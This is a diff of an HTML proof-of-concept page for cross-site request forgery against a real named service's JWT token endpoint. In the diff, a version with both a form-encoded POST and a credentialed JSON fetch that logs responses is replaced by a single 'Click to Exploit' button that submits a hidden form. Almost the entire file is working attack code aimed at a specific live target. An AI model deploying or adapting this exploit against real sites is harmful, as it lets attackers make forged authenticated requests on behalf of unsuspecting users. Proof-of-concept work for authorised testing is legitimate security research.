@@ -2,58 +2,29 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>CSRF PoC - Dual Test</title>
+  <title>CSRF PoC</title>
 </head>
 <body>
-  <h2>CSRF PoC - Form & JSON Test</h2>
-  <button onclick="testForm()">Send Form-Encoded CSRF</button>
-  <button onclick="testJSON()">Send JSON CSRF</button>
-
-  <pre id="output"></pre>
+  <h2>CSRF Proof of Concept</h2>
+  <button onclick="exploit()">Click to Exploit</button>
 
   <script>
-    function log(msg) {
-      document.getElementById("output").textContent += msg + "\n";
-    }
-
-    // ✅ Allowed by browsers in real CSRF
-    function testForm() {
-      log("=== Sending Form-Encoded CSRF ===");
+    function exploit() {
       var f = document.createElement("form");
-      f.method = "POST";
-      f.action = "https://www.datacamp.com/api/jwt/token"; // replace with target endpoint
+      f.method = "POST"; // or GET, depending on your case
+      f.action = "https://www.datacamp.com/api/jwt/token"; // replace with the vulnerable endpoint
 
+      // Example payload (modify depending on action you tested)
       var input = document.createElement("input");
       input.type = "hidden";
       input.name = "id";
-      input.value = "123"; // example payload
+      input.value = "123"; 
       f.appendChild(input);
 
       document.body.appendChild(f);
       f.submit();
-      log("Form submitted. If server accepts x-www-form-urlencoded → VULNERABLE.");
-    }
 
-    // ❌ Needs CORS bypass to succeed
-    function testJSON() {
-      log("=== Sending JSON with custom headers ===");
-      fetch("https://www.datacamp.com/api/jwt/token", {
-        method: "POST",
-        credentials: "include",
-        headers: {
-          "Content-Type": "application/json",
-          "X-Requested-With": "XMLHttpRequest"
-        },
-        body: JSON.stringify({ id: "123" })
-      })
-      .then(async res => {
-        log("Status: " + res.status);
-        const txt = await res.text();
-        log("Response:\n" + txt);
-      })
-      .catch(err => {
-        log("Error: " + err);
-      });
+      alert("CSRF Exploit Triggered!");
     }
   </script>
 </body>
